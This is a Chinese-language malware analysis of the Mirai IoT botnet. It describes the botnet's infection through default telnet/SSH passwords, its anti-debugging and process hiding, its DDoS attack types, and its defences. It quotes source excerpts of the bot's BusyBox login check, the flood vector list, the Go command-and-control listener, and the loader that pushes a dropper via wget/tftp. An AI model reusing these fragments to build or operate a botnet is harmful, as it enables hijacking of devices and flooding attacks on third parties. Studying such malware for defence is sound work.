#### 代码结构
主要包含两个文件夹，其中loader文件夹为加载器，完成服务端创建和状态监控的功能；mirai文件夹完成主要的恶意功能，包含网络连接、DDOS执行、下载（等工具的实现）以及主控端操作功能

#### 感染途径
攻击者通过SSH或Telnet账号，使用默认密码入侵物联网设备

#### 功能实现

#### Bot
代码实现的恶意功能从源码来看，主要包含3方面，主要是bot文件夹，实现反调试、隐藏自身进程、设置初始的域名端口值、设置默认弱口令、网络连接及DDOS攻击功能；
Tools文件夹，实现wget、更新文件、异或数据等工具性功能；

```
static void anti_gdb_entry(int);
static void resolve_cnc_addr(void);
static void establish_connection(void);
static void teardown_connection(void);
static void ensure_single_instance(void);
static BOOL unlock_tbl_if_nodebug(char *);
```

- 如果监测到gdb调试，则进行自删除，阻止watchdog重新启动设备，并显示连接CC地址失败
- 确保每次只有一个实例运行（通过连接本地端口48101）,并通过此端口号关闭相对应的进程
- 隐藏进程
- 攻击初始化，设置攻击类型，包含UDP、VSE、DNS、SYN等多种DDOS攻击方式
- 端口初始化，通过端口号关闭使用telnet、SSH、HTTP服务的其他进程，并防止其重新启动
- 扫描初始化，扫描局域网中具有弱口令以及开放23端口的其他设备

#### 连接域名及端口号
- 在源码中硬编码方式嵌入了连接的域名和端口号，其中的域名字符串都可以使用Tools文件夹下的enc.c所示的算法进行还原
- 其目标为使用busybox的设备
```
if (memmem(buf, got, "BusyBox", 7) != NULL)
{
    state->got_prompt = 1;
    
    //maybe we are logged in already? LOL
    sockprintf(state->fd, "enable\r\n");
    state->state = 7;
    break;
}
```
- DDOS攻击方法
```
#define ATK_VEC_UDP        0  /* Straight up UDP flood */
#define ATK_VEC_VSE        1  /* Valve Source Engine query flood */
#define ATK_VEC_DNS        2  /* DNS water torture */
#define ATK_VEC_SYN        3  /* SYN flood with options */
#define ATK_VEC_ACK        4  /* ACK flood */
#define ATK_VEC_STOMP      5  /* ACK flood to bypass mitigation devices */
#define ATK_VEC_GREIP       6  /* GRE IP flood */
#define ATK_VEC_GREETH     7  /* GRE Ethernet flood */
//#define ATK_VEC_PROXY     8  /* Proxy knockback connection */
#define ATK_VEC_UDP_PLAIN  9  /* Plain UDP flood optimized for speed */
#define ATK_VEC_HTTP        10 /* HTTP layer 7 flood */
```
- 设置用户名密码

#### CNC文件夹
监听端口23和101，分别完成不同的操作。此部分操作主要为主控端的操作
```
funcmain() {
  tel, err := net.Listen("tcp", "0.0.0.0:23")
  if err != nil {
    fmt.Println(err)
    return
  }
  api, err := net.Listen("tcp", "0.0.0.0:101")
  if err != nil {
    fmt.Println(err)
    return
  }
  gofunc() {
    for {
      conn, err := api.Accept()
      if err != nil {
          break
      }
      goapiHandler(conn)
    }
  }()
  for {
    conn, err := tel.Accept()
    if err != nil {
        break
    }
    goinitialHandler(conn)
  }
}
```

#### Tools文件夹
- Single_Load.c 加载文件
- Wget.c 获取远程文件
- Nogdb.c(更新文件信息)
- Badbot.c(显示指定的bot信息)

#### loader文件夹
其主要功能是创建服务器，同时监控连接的状态
```
if (!binary_init()) {
  printf("Failed to load bins/dlr.* as dropper\n");
  return 1;
}

/* wget address tftp address */
if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "100.200.100.100", 80, "100.200.100.100")) == NULL)
{
    printf("Failed to initialize server. Aborting\n");
    return 1;
}

pthread_create(&stats_thrd, NULL, stats_thread, NULL);
// Read from stdin

while (TRUE) {
    char strbuf[1024];
    if (fgets(strbuf, sizeof (strbuf), stdin) == NULL) {
        break;
    }

    util_trim(strbuf);

    if (strlen(strbuf) == 0) {
        usleep(10000);
        continue;
    }

    memset(&info, 0, sizeof(struct telnet_info));

    if (telnet_info_parse(strbuf, &info) == NULL) {
        printf("Failed to parse telnet info: \"%s\" Format -> ip:port user:pass arch\n", strbuf);
    } else {
        if (srv == NULL)
            printf("srv == NULL 2\n");

        server_queue_telnet(srv, &info);
        if (total++ % 1000 == 0)
            sleep(1);
    }
    ATOMIC_INC(&srv->total_input);
}

printf("Hit end of input.\n");

while(ATOMIC_GET(&srv->curr_open) > 0) {
  sleep(1);
}

return 0;
```
#### 防护方法
其攻击针对的对象主要是安装了busybox工具的linux操作系统的设备

- 修改初始口令以及弱口令，加固用户名和密码的安全性
- 禁用48101端口
- 关闭telnet连接（使用了23端口）
- busybox工具只允许特定用户进行使用
